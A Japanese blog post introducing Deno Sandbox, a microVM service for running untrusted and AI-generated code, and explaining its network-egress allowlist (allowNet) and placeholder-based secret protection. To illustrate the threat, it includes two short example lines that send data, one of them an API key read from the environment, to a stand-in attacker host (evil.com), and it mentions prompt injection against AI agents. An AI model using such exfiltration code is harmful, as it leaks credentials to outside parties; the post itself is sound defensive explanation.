---
title: "Deno Sandboxのご紹介——allowNetとsecretsで実現するAIエージェント時代のセキュリティ"
date: 2026-02-04
tags: ["Deno", "security", "AI"]
description: "この半年間開発に携わってきたDeno Sandboxがついに公開。allowNetとsecrets機能がAIエージェント時代になぜ重要なのかを解説する"
draft: true
---

本日、[Deno Sandbox](https://deno.com/blog/introducing-deno-sandbox)が公開された。

この機能の開発にはこの半年ほど関わってきたので、個人的にも感慨深い。この記事では、Deno Sandboxの概要と、その中でも特に自分が力を入れて開発してきた`allowNet`と`secrets`という2つの機能について紹介したい。

## Deno Sandboxとは

Deno Sandboxは、信頼できないコードを安全に実行するための軽量Linux microVMを提供するサービスだ。[Deno Deploy](https://deno.com/deploy)のインフラ上で動作し、ミリ秒単位で起動する。

```javascript
import { Sandbox } from "@deno/sandbox";

const sandbox = await Sandbox.create();
const result = await sandbox.run(`
  console.log("Hello from sandbox!");
  export default 42;
`);
console.log(result); // 42
await sandbox.close();
```

Deno、Node.js(v24+)、Python(3.10+)のランタイムをサポートしており、既存のコードをそのままサンドボックス内で実行できる。

## なぜDeno Sandboxが必要なのか

「信頼できないコードを安全に実行する」——これは昔からある課題だ。プラグインシステムやユーザー提供のスクリプト実行など、さまざまな場面でこのニーズは存在してきた。

しかし、2025年〜2026年において、この課題の重要性は格段に増している。

その理由は、**AIエージェント**だ。

## AIエージェント時代のセキュリティ課題

最近の開発では、AIエージェントにコードを書かせることが当たり前になってきた。[自分の以前の記事](/blog/the-era-of-humans-writing-code-is-over/)でも触れたが、AIが運転席に座り、人間は助手席でナビゲーションをするようなスタイルで仕事をすることが増えた。

この流れは加速している。AIエージェントに強い権限を与え、自律的にタスクをこなしてもらう——そんな使い方が広がっている。

ここで問題になるのが、**AIが生成したコードをどう安全に実行するか**だ。

AIは便利だが、完璧ではない。プロンプトインジェクション[^1]によって意図しないコードが実行される可能性もある。外部APIを呼び出すコードをAIに書かせる場合、APIキーなどの機密情報を渡す必要があるが、悪意のあるコードがそれを外部に送信してしまうリスクがある。

[^1]: AIに対する入力を巧みに操作することで、本来意図していない動作をさせる攻撃手法

従来のサンドボックス技術は「コンピュートの隔離」に焦点を当てていた。つまり、サンドボックス内のコードがホストシステムに影響を与えないようにすることだ。しかし、AIエージェント時代においては、それだけでは不十分だ。

必要なのは:

1. **ネットワーク出口の制御** — どこに通信できるかを制限する
2. **機密情報の保護** — シークレットが悪用されないようにする

Deno Sandboxの`allowNet`と`secrets`は、まさにこの2つの課題を解決するために設計された機能だ。

## allowNet: ネットワーク出口の制御

`allowNet`オプションを使うと、サンドボックスから通信可能なホストを制限できる。

```javascript
import { Sandbox } from "@deno/sandbox";

const sandbox = await Sandbox.create({
  allowNet: ["api.openai.com", "api.anthropic.com"],
});

// ✅ これはOK
await sandbox.run(`
  await fetch("https://api.openai.com/v1/chat/completions", { ... });
`);

// ❌ これはブロックされる
await sandbox.run(`
  await fetch("https://evil.com/steal-data", { ... });
`);
```

指定されていないホストへのリクエストは、VM境界でブロックされる。これにより、たとえプロンプトインジェクションによって悪意のあるコードが実行されたとしても、データを外部に送信することはできない。

### 実装について

`allowNet`の実装は、サンドボックスからのすべてのアウトバウンド接続が経由するプロキシによって実現されている。このプロキシがチョークポイント[^2]となり、セキュリティポリシーを強制する。

[^2]: ネットワークトラフィックが必ず通過する単一のポイント。ここでポリシーを適用することで、確実にすべての通信を制御できる

類似のアプローチとして、[coder/httpjail](https://github.com/coder/httpjail)がある。Deno Sandboxでは、これと似た発想でありつつも、Deno Deployのインフラに最適化された実装を行っている。

## secrets: 機密情報の革新的な保護

`secrets`機能は、Deno Sandboxの中でも特にユニークな機能だと思っている。

従来のシークレット管理では、シークレットを環境変数などでアプリケーションに渡すのが一般的だ。しかし、これには問題がある——アプリケーション内でシークレットの値を読み取れてしまうのだ。

```javascript
// 従来の方法: シークレットがアプリケーション内で見えてしまう
const apiKey = process.env.OPENAI_API_KEY;
console.log(apiKey); // 😱 シークレットが露出！

// 悪意のあるコードがこれを外部に送信できてしまう
await fetch("https://evil.com/steal", { body: apiKey });
```

Deno Sandboxの`secrets`機能は、この問題を根本から解決する。

```javascript
import { Sandbox } from "@deno/sandbox";

const sandbox = await Sandbox.create({
  allowNet: ["api.openai.com"],
  secrets: {
    OPENAI_API_KEY: {
      hosts: ["api.openai.com"],
      value: process.env.OPENAI_API_KEY,
    },
  },
});

await sandbox.run(`
  // サンドボックス内では、シークレットはプレースホルダーになっている
  const apiKey = Deno.env.get("OPENAI_API_KEY");
  console.log(apiKey); // "deno-secret-placeholder:xxxxx" のような値が出力される

  // api.openai.comへのリクエスト時のみ、実際の値に置換される
  await fetch("https://api.openai.com/v1/chat/completions", {
    headers: {
      "Authorization": \`Bearer \${apiKey}\`,
    },
    // ...
  });
`);
```

### どういう仕組みか

シークレットの実際の値は、サンドボックス環境には一切入らない。代わりに、安全なプレースホルダートークンが渡される。

実際の値への置換は、**ネットワークレイヤー**で行われる。具体的には:

1. サンドボックスからのアウトバウンドリクエストはすべてプロキシを経由する
2. プロキシはリクエスト先のホストをチェックする
3. ホストが`secrets`の設定で許可されている場合のみ、プレースホルダーを実際の値に置換する
4. 許可されていないホストへのリクエストでは、プレースホルダーはそのまま(=無効な値として)送信される

これにより、たとえプロンプトインジェクションによって`evil.com`にシークレットを送信しようとするコードが実行されたとしても:

- `allowNet`でブロックされるか、
- 仮に`allowNet`に`evil.com`が含まれていたとしても、`secrets`の`hosts`設定により、実際の値は送信されない

二重の防御が機能する。

### Flyのtokenizerとの関係

この「シークレットをプレースホルダーで置き換え、ネットワークレイヤーで復元する」というパターンは、[Fly.io](https://fly.io/)の[tokenizer](https://github.com/superfly/tokenizer)プロジェクトでも採用されている。

Deno Sandboxでは、このパターンを`allowNet`によるネットワーク制限と組み合わせることで、より強固なセキュリティを実現している。

## 開発を振り返って

この半年間、`allowNet`と`secrets`の実装に深く関わってきた。

特に苦労したのは、プロキシでのシークレット置換の実装だ。HTTPリクエストのさまざまな箇所——ヘッダー、ボディ、クエリパラメータ——にシークレットが含まれる可能性があり、それらすべてを正しく処理する必要があった。また、パフォーマンスへの影響を最小限に抑えることも重要だった。

エッジケースの洗い出しとテストにも時間をかけた。「本当にシークレットが漏れないか」を保証するためには、あらゆる攻撃パターンを想定してテストを書く必要があった。

結果として、自信を持ってリリースできるものになったと思う。

## おわりに

Deno Sandboxは、AIエージェント時代のセキュリティ課題に正面から取り組んだプロダクトだ。

`allowNet`でネットワーク出口を制御し、`secrets`で機密情報を保護する——この2つの機能により、AIが生成したコードを安心して実行できる環境を提供できる。

現在はベータ版として提供されており、誰でも試すことができる。ぜひ使ってみてフィードバックをもらえると嬉しい。

- [公式ブログ記事](https://deno.com/blog/introducing-deno-sandbox)
- [ドキュメント](https://docs.deno.com/sandbox/)
- [npm / JSR](https://jsr.io/@deno/sandbox)

この機能が、AIとともにソフトウェアを作る時代のインフラとして役立つことを願っている。
